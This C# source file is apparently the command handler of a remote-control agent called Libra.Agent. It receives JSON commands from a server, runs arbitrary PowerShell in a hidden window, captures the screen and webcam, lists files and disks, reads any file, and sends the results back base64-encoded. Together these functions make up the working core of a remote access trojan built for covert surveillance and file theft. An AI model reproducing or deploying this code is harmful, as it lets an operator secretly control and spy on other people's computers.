using Libra.Agent.Helper;
using Libra.Agent.Models;
using Libra.Virgo;
using Libra.Virgo.Enum;
using Libra.Virgo.Models.MessageType;
using System;
using System.Buffers.Text;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Text.Json;

namespace Libra.Agent.Handle
{
    internal class CommandHandle
    {
        static CommandModel Packet = new();
        public static async Task Handle(string dataJson)
        {
            if (string.IsNullOrEmpty(dataJson)) return;

            try
            {
                Packet = JsonSerializer.Deserialize<CommandModel>(dataJson, AgentJsonContext.Default.CommandModel);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"解析命令数据失败: {ex.Message}");
                Console.WriteLine($"原始数据: {dataJson}");
                return;
            }

            if (Packet == null) return;

            Console.WriteLine($"收到命令: {Packet.Type}, {string.Join(" ", Packet.Parameter)}");

            switch (Packet.Type)
            {
                case CommandType.Shell:
                    var result = await ExecuteCommandAsync(string.Join(" ", Packet.Parameter));
                    var sendResult = await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult()
                    {
                        TaskId = Packet.TaskId,
                        Result = Convert.ToBase64String(Encoding.UTF8.GetBytes(result)),
                        EndTime = DateTime.Now
                    });
                    Console.WriteLine($"执行结果: 结果长度 {result.Length}, {sendResult}");
                    break;

                case CommandType.GetFrame:
                    var frame = MonitorHelper.CaptureScreenCompressed((int)(MonitorHelper.GetSystemMetrics(0) / 1.2), (int)(MonitorHelper.GetSystemMetrics(1) / 1.2), 25);
                    var sendframeResult = await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult()
                    {
                        TaskId = Packet.TaskId,
                        Result = Convert.ToBase64String(frame),
                        EndTime = DateTime.Now
                    });
                    Console.WriteLine($"执行结果: 帧大小 {frame.Length}Byte,{sendframeResult}");
                    break;

                case CommandType.GetFiles:
                    var files = InfoHelper.Files(Packet.Parameter[0]);
                    var sendfilesResult = await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult()
                    {
                        TaskId = Packet.TaskId,
                        Result = Convert.ToBase64String(Encoding.UTF8.GetBytes(JsonSerializer.Serialize(files, VirgoJson.Options))),
                        EndTime = DateTime.Now
                    });
                    Console.WriteLine($"执行结果: 文件/文件夹数量 {files.Length},{sendfilesResult}");
                    break;

                case CommandType.GetDisks:
                    var disks = InfoHelper.Drives();
                    var senddisksResult = await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult()
                    {
                        TaskId = Packet.TaskId,
                        Result = Convert.ToBase64String(Encoding.UTF8.GetBytes(JsonSerializer.Serialize(disks, VirgoJson.Options))),
                        EndTime = DateTime.Now
                    });
                    Console.WriteLine($"执行结果: 磁盘数量 {disks.Count},{senddisksResult}");
                    break;

                case CommandType.ReadFile:
                    var filepath = Packet.Parameter[0];
                    if (!File.Exists(filepath))
                    {
                        await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult()
                        {
                            TaskId = Packet.TaskId,
                            Result = "",
                            EndTime = DateTime.Now
                        });
                        return;
                    }

                    var file = File.ReadAllBytes(filepath);
                    var sendfileResult = await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult()
                    {
                        TaskId = Packet.TaskId,
                        Result = Convert.ToBase64String(file),
                        EndTime = DateTime.Now
                    });
                    Console.WriteLine($"执行结果: 文件大小 {file.Length}Byte,{sendfileResult}");
                    break;

                case CommandType.GetCameraFrame:

                    var cameraBytes = MonitorHelper.CaptureCameraFrame(
                        cameraIndex: 0,
                        width: 1280,
                        height: 720,
                        jpegQuality: 60);

                    if (cameraBytes == null)
                    {
                        Console.WriteLine("摄像头采集失败");
                        break;
                    }

                    var sendcameraResult = await Runtimes.SendMessage(
                        VirgoMessageType.Command,
                        new CommandResult()
                        {
                            TaskId = Packet.TaskId,
                            Result = Convert.ToBase64String(cameraBytes),
                            EndTime = DateTime.Now
                        });

                    Console.WriteLine($"执行结果: 帧大小 {cameraBytes.Length}Byte,{sendcameraResult}");
                    break;



                default:
                    break;
            }
        }

        public static async Task<string> ExecuteCommandAsync(string command)
        {
            var psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -Command \"[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; " + command + "\"",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                StandardOutputEncoding = Encoding.UTF8,
                StandardErrorEncoding = Encoding.UTF8,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using var process = Process.Start(psi);

            string output = await process.StandardOutput.ReadToEndAsync();
            string error = await process.StandardError.ReadToEndAsync();

            await process.WaitForExitAsync();

            return output + error;
        }
    }
}
